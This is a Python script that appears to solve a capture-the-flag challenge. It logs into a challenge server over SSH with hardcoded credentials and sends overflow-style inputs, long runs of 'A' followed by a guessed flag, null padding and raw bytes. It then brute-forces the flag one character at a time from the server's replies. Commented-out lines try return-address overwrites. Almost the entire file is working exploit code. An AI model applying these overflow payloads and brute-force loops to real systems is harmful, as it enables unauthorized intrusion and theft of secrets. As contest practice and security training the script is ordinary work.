import paramiko
import time


import warnings
warnings.filterwarnings("ignore")


class SshClient:
    def __init__(self, ip, port, username, password, key_path=None):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.key_path = key_path
        self.ssh_connection = None
    
    def __enter__(self):
        try:
            # key = paramiko.RSAKey.from_private_key_file(self.key_path, password=self.password)
            
            self.ssh_connection = paramiko.SSHClient()
            self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            self.ssh_connection.connect(self.ip, self.port, self.username, self.password)

            return self


        except Exception as e:
            print("[!] Exception: {}".format(e))

    def __exit__(self, exception_type, exception_value, traceback):
        if self.ssh_connection:
            self.ssh_connection.close()
    
    def execute_command(self, command):
        stdin, stdout, stderr = self.ssh_connection.exec_command(command)

        while not stdout.channel.exit_status_ready() and not stdout.channel.recv_ready():time.sleep(1)
        
        return stdin, stdout, stderr


def server_logic(guess):
    magic = ["M", "A", "G", "I", "C"]
    magics = ""
    for i in range(len(guess)):
        magics += magic[i % len(magic)]

    bufs = []
    for i in range(len(guess)):
        c = ord(guess[i])

        if 65 <= c <= 90:
            c -= 65
            c = ord(magics[i]) + c
            c -= 65

            c %= 26

            c += 65
            bufs += chr(c)
        elif 97 <= c <= 122:
            c -= 97
            c = ord(magics[i].lower()) + c
            c -= 97
            
            c %= 26
            c += 97

            bufs += chr(c)
        else:
            bufs += chr(c)

    print(bufs)
    pass



if __name__ == '__main__':
    index = 31
    flag = "XXXXXXXXXXXX_XXXXXXX\x00\x00\x00\x00XXXXXXXX"

    _i = 0
    characters = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+\{\}[]></;'"
    # characters = "_"
    # characters = "rstuvwxyz0123456789!@#$%^&*()_+\{\}[]></;'"
    # characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    test = characters[_i]
    print("test now is: {}".format(test))

    i = 0
    while True:
        i += 1
        # print("Iteration: {}".format(i))
        with SshClient("35.157.31.6", 22, "challenger", "arkcon") as ssh_client:
            shell = ssh_client.ssh_connection.invoke_shell()

            data = shell.recv(1024)
            # print(data)


            # "\x41\x2f"
            test_flag = flag[:index] + test + flag[index+1:]
            print(test_flag)
            # test_flag = test*16
            # nick = "A"*144 + "\n"
            nick = "A" * 64 + test_flag + "\x00"*24 + "\x17" + "\r"
            # nick = "A" * 112 + "\r"
            # nick = "A" * 120 + "\x81\x2c" + "\r"
            # nick = "A" * 120 + "\x41\x2f" + "\r"
            
            # nick = "A"*112 + "\n"
            
            data = nick

            # print(data)
            shell.sendall(data)

            data = shell.recv(1024)
            # print(data)

            # i_1 = 8 + len(nick)-1 + 4 + len(nick)-1
            # addr = data[i_1: i_1 + 6]
            # if addr[-1] == ' ': addr = addr[:-1] + "\x00"
            # addr = addr + "\x00\x00"
            # addr = "\x24\x2b" + addr[2:]
            # print(len(addr))

            # # print(data[i: i + 6])
            # print(addr.encode('hex'))

            data = "2\r"
            shell.sendall(data)
            
            data = shell.recv(1024)
            print(data)


            # guess = test_flag + "A"*(136 - 32) + "\x24\x2b" + '\r'
            # data = guess
            # shell.sendall(data)

            # data = shell.recv(1024)
            # print(data)

            # import time
            # time.sleep(1)

            # data = shell.recv(1024)
            # print(data)


            # print(data)
            
            if "Wrong! Try again ;)" in data:
                _i += 1
                test = characters[_i]
                print("test now is: {}".format(test))
            elif "Flag found" in data:
                print("Found: {}!".format(test))
                break



        # ssh_client.ssh_connection.

    # server_logic("sahfiqlgfq;o;qg")